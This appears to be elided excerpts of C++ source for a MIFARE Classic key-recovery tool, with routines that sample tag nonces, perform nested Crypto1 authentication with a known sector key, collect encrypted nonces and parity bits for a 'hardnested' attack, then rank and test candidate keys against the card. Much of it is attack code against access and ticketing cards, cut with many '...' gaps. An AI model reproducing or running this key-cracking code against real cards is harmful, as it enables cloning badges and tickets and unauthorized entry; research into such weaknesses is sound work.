...
)
{
    ...
    std::vector<std::pair<std::size_t, uint64_t>> rankedKeys;
...
;
	...
	/*-------------------------------------- get nonce distance  ---------------------------------------*/
	if( !authenticateManually( knownCommand, knownBlockAddr, &n_T, knownKey ) )
	{
	...
	t_cmd = targetCommand;// stupid way to pass arguments to threads
	t_blockAddr = targetBlockAddr;
	...
	for (std::size_t begin = 0; begin < allKeys.size(); )
	{
	    std::size_t end = begin + 1;
	    while (end < allKeys.size() && allKeys[end] == allKeys[begin])
	    {
	        ++end;
	    }
	    ...
	    if (count >= 2)
	    {
	        rankedKeys.emplace_back(count, allKeys[begin]);
	    }
	    begin = end;
	}
	...
	if (rankedKeys.size() > 10) rankedKeys.resize(10);
	...
	for (const auto &ranked : rankedKeys)
	{
	    uint64_t pk = ranked.second;
	    const uint64_t pkStore = pk;
	    ...
	    parityOn();
	    if (!selectCard(100, 10)) continue;
	
	
	    if( authenticateManually( targetCommand, targetBlockAddr, &n_T, plausibleKey ) )
	    {
		std::cout << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
		...
		{
		    p_keys[targetBlockAddr/4][i] = plausibleKey[i];
		}

        if (recoveredKey != nullptr)
        {
            for (int i = 0; i < 6; ++i) recoveredKey[i] = plausibleKey[i];
        }
...
void MFrec::t_recoverKey( )
{
    ...
    const int firstDistance = static_cast<int>(medianDist) - TOLERANCE;
    const int lastDistance = static_cast<int>(medianDist) + TOLERANCE;
    for( int j = firstDistance; j <= lastDistance; j+=2 )
    {
...
/*
 * Request and capture the first unencrypted tag nonce.
 * Authentication is deliberately not completed.
 */
bool MFrec::sampleNonce(byte command, byte blockAddr, uint32_t *nonce)
{
    if (nonce == nullptr) {
        return false;
    }
    ...
    byte data[8] = {0};
    byte parityBits[8] = {0};
    byte authCommand[4] = {0};

    resetPICC(10);
    parityOn();
    if (!selectCard(20, 5)) return false;
    parityOff();

    authCommand[0] = command;
    authCommand[1] = blockAddr;

    calcCRC(authCommand, 2, &authCommand[2]);

    for (int i = 0; i < 4; ++i) {
        parityBits[i] = oddparity(authCommand[i]);
    }

    const byte validBits =
        makeRawFrame(authCommand, 4, parityBits, packet);
    ...
    extractData(packet, 5, parityBits, data);
    *nonce = static_cast<uint32_t>(bytesToInt(data, 4));
...
/*
 * Collect one encrypted target nonce through nested authentication.
 *
 * The result consists of:
 *   - 32 encrypted nonce bits
 *   - four encrypted parity bits, packed into bits 0 through 3
 *
 * Bit 0 is the parity bit associated with the first nonce byte.
 */
bool MFrec::collectHardnestedNonce(
    byte knownCommand,
    byte knownBlockAddr,
    byte *knownKey,
    byte targetCommand,
...
)
{
    if (
        knownKey == nullptr ||
        encryptedNonce == nullptr ||
        encryptedParity == nullptr
    ) {
        return false;
    }
    ...
    byte packet[9] = {0};
    byte plainCommand[4] = {0};
    byte cipherCommand[4] = {0};
    byte transmitParity[4] = {0};
    byte receiveParity[4] = {0};
    byte receivedData[8] = {0};

    uint32_t knownNonce = 0;
    ...
    /*
     * Do not use initCom() here. The repository implementation waits
     * forever when the card cannot be selected, which also prevents
    ...
    /*
     * Complete a normal authentication against the sector for which
     * we know the key. This leaves Crypto1 active.
     */
    if (
    ...
    /*
     * Build AUTH A/B + target block + CRC.
     */
    plainCommand[0] = targetCommand;
    plainCommand[1] = targetBlockAddr;
    calcCRC(plainCommand, 2, &plainCommand[2]);

    /*
     * Encrypt the nested authentication request and its parity bits
     * with the active Crypto1 stream from the known authentication.
     */
    for (int index = 0; index < 4; ++index) {
        cipherCommand[index] =
            crypto1_byte(keystream, 0x00, 0) ^
            plainCommand[index];

        transmitParity[index] =
            filter(keystream->odd) ^
            oddparity(plainCommand[index]);
    }

    const byte validBits = makeRawFrame(
        cipherCommand,
        4,
        transmitParity,
        packet
    ...
    /*
     * The tag responds with four encrypted nonce bytes plus one
     * encrypted parity bit for each byte.
     */
    if (
        !piccIO(
            TRANSCEIVE,
    ...
    *encryptedNonce = static_cast<uint32_t>(
        bytesToInt(receivedData, 4)
    );
    ...
    for (int index = 0; index < 4; ++index) {
        packedParity |=
            static_cast<byte>(
                (receiveParity[index] & 1U) << index
            );
    }

    *encryptedParity = packedParity;
